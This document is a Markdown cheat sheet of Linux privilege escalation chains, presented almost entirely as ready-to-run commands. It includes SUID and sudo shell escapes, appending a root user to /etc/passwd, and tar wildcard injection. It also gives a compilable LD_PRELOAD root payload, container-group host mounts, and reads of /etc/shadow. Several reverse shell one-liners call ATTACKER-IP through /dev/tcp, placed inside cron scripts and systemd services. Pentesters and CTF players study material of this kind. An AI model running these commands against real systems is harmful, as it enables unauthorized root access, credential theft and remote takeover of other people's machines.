# Linux Privesc Chains

## SUID find/vim/python/nmap → root
```bash
find / -perm -4000 -type f 2>/dev/null
# Abuse examples:
find . -exec /bin/sh -p \;
vim -c ':!/bin/sh'
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
nmap --interactive  # (old versions) → !sh
```

## sudo -l → GTFOBins
```bash
sudo -l
# Check each binary at https://gtfobins.github.io/
# Common quick wins:
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo /usr/bin/env /bin/bash
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find / -exec /bin/bash \;
```

## Writable /etc/passwd → add root user
```bash
ls -la /etc/passwd
# If writable:
openssl passwd -1 password123
echo 'hacker:HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

## Cronjob + writable script → reverse shell
```bash
cat /etc/crontab
ls -la /etc/cron.*
# Find writable script in cron:
echo 'bash -i >& /dev/tcp/ATTACKER-IP/443 0>&1' >> /path/to/cron_script.sh
```

## Tar Wildcard Injection (cronjob running tar with *)
```bash
# If cron runs: tar czf /tmp/backup.tar.gz *
# In the wildcard directory:
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/ATTACKER-IP/443 0>&1' > shell.sh
chmod +x shell.sh
```

## Capabilities (cap_setuid on python/perl)
```bash
getcap -r / 2>/dev/null
# If python3 has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# If perl has cap_setuid+ep:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

## LD_PRELOAD with sudo
```bash
# sudo -l shows: env_keep+=LD_PRELOAD
# Compile malicious shared object:
cat <<'EOF' > /tmp/pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/ANY_ALLOWED_BINARY
```

## NFS no_root_squash → mount + SUID binary
```bash
# On attacker (check exports):
showmount -e TARGET-IP
# If no_root_squash:
mkdir /tmp/nfs && mount -t nfs TARGET-IP:/shared /tmp/nfs
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# On target:
/shared/bash -p
```

## Docker Group → mount host filesystem
```bash
id  # Check if user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Or:
docker run -v /:/mnt -it alpine cat /mnt/etc/shadow
```

## Disk Group → debugfs → read /etc/shadow
```bash
id  # Check if user is in disk group
debugfs /dev/sda1
# In debugfs:
cat /etc/shadow
```

## Kernel Exploits
```bash
uname -a && cat /etc/os-release
# DirtyCow (< 4.8.3): CVE-2016-5195
# DirtyPipe (5.8 - 5.16.11): CVE-2022-0847
# PwnKit (polkit < 0.120): CVE-2021-4034
python3 PwnKit.py  # or ./PwnKit
```

## PATH Hijacking
```bash
# Find script/binary run by root that calls a command without full path
echo '/bin/bash' > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
# Trigger the vulnerable script
```

## Writable systemd Service → restart → root
```bash
find / -writable -name "*.service" 2>/dev/null
# Edit the service:
# [Service]
# ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/443 0>&1'
systemctl daemon-reload
systemctl restart vuln.service
```

## lxd/lxc Group Privesc
```bash
id  # Check for lxd group
# On attacker: build alpine image
lxd init  # Accept defaults
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc -- /bin/sh
# Host filesystem at /mnt/root
```

## Shared Library Hijacking
```bash
# Find binaries with missing libraries:
ldd /usr/local/bin/vuln_binary
# Check for writable library paths:
# Compile malicious .so, place in searched path
gcc -shared -fPIC -o /tmp/libmissing.so /tmp/evil.c
# Trigger the binary
```
